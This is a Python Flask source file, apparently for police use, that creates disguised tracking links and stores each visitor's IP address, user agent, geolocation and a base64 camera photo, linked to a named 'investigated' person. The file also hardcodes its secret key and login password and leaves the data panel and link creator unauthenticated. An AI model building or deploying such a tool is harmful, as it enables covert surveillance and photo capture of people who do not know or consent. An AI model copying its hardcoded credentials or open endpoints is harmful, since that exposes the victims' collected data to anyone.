from flask import Flask, request, render_template, jsonify, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import random
import string
from flask import Flask, request, render_template, jsonify, redirect, url_for, session
from functools import wraps
from flask_migrate import Migrate
import os

app = Flask(__name__, instance_relative_config=True)
app.secret_key = 'P@licia1080#'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(app.instance_path, 'dados.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

os.makedirs(app.instance_path, exist_ok=True)

db = SQLAlchemy(app)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        usuario = request.form["usuario"]
        senha = request.form["senha"]
        if usuario == "policia" and senha == "Itapipoca2025civil#":
            session["logado"] = True
            return redirect(url_for("gerenciar"))
        else:
            return render_template("login.html", erro="Usuário ou senha incorretos.")
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop("logado", None)
    return redirect(url_for("login"))

def login_requerido(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get("logado"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated_function

@app.route("/gerenciar")
@login_requerido
def gerenciar():
    return render_template("gerenciar.html")


# Tabela de links
class Link(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100), unique=True, nullable=False)
    destino = db.Column(db.String(300), nullable=False)
    nome_investigado = db.Column(db.String(200))  # <== este campo precisa estar aqui

# Tabela de acessos
class Acesso(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100))
    ip = db.Column(db.String(100))
    user_agent = db.Column(db.String(300))
    latitude = db.Column(db.String(50))
    longitude = db.Column(db.String(50))
    foto_base64 = db.Column(db.Text)
    data = db.Column(db.DateTime, default=datetime.now)
    

# Tabela de registros (IP e User-Agent)
class Registro(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(100))
    user_agent = db.Column(db.String(300))
    latitude = db.Column(db.String(50))
    longitude = db.Column(db.String(50))
    timestamp = db.Column(db.String(50))
    foto_base64 = db.Column(db.Text)
    slug = db.Column(db.String(100))  # ✅ Esse campo precisa existir!

with app.app_context():
    db.create_all()

# Página de criação de links
@app.route("/criar_link", methods=["GET", "POST"])
def criar_link():
    if request.method == "POST":
        nome_investigado = request.form["nome_investigado"]
        destino = request.form["destino"]
        slug = request.form["slug"] or gerar_slug()

        if Link.query.filter_by(slug=slug).first():
            return "Slug já existe! Escolha outro.", 400

        novo_link = Link(
            slug=slug,
            destino=destino,
            nome_investigado=nome_investigado
        )
        db.session.add(novo_link)
        db.session.commit()

        url_final = url_for('rastrear_link', slug=slug, _external=True)
        return render_template("link_gerado.html", link=url_final)

    return render_template("criar_link.html")

# Gera slugs aleatórios
def gerar_slug(tamanho=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=tamanho))

# Acessa o link disfarçado
@app.route("/link/<slug>")
def rastrear_link(slug):
    link = Link.query.filter_by(slug=slug).first()
    if not link:
        return "Link não encontrado", 404

    visitor_ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    novo = Registro(ip=visitor_ip, user_agent=user_agent, timestamp=timestamp,slug=slug )
    db.session.add(novo)
    db.session.commit()

    return render_template("index.html", slug=slug)

# Página inicial
@app.route("/todos_links")
@login_requerido
def todos_links():
    links = Link.query.order_by(Link.id.desc()).all()
    return render_template("todos_links.html", links=links)



@app.route("/excluir_link/<int:link_id>", methods=["POST"])
@login_requerido
def excluir_link(link_id):
    link = Link.query.get_or_404(link_id)
    db.session.delete(link)
    db.session.commit()
    return redirect(url_for('todos_links'))


# Coleta dados de IP, localização e foto
@app.route("/coletar_dados", methods=["POST"])
def coletar_dados():
    data = request.json
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    slug = data.get("slug")

    acesso = Acesso(
        slug=slug,
        ip=ip,
        user_agent=user_agent,
        latitude=data.get("latitude"),
        longitude=data.get("longitude"),
        foto_base64=data.get("foto_base64")
        
    )
    db.session.add(acesso)

    # Atualiza o último registro
    ultimo = Registro.query.order_by(Registro.id.desc()).first()
    if ultimo:
        if 'latitude' in data and 'longitude' in data:
            ultimo.latitude = data['latitude']
            ultimo.longitude = data['longitude']
        if 'foto_base64' in data:
            ultimo.foto_base64 = data['foto_base64']

    db.session.commit()

    destino = Link.query.filter_by(slug=slug).first()
    if destino:
        return jsonify({"destino": destino.destino})
    else:
        return jsonify({"destino": "https://g1.globo.com"})

# Painel para visualizar os acessos
@app.route("/painel")
def painel():
    registros = Registro.query.order_by(Registro.timestamp.desc()).all()

    # Carregar todos os links, organizando por slug
    todos_links = Link.query.all()
    links = {link.slug: link.nome_investigado for link in todos_links}

    return render_template("painel.html", registros=registros, links=links)

# Inicia o servidor
if __name__ == "__main__":
    app.run(debug=True)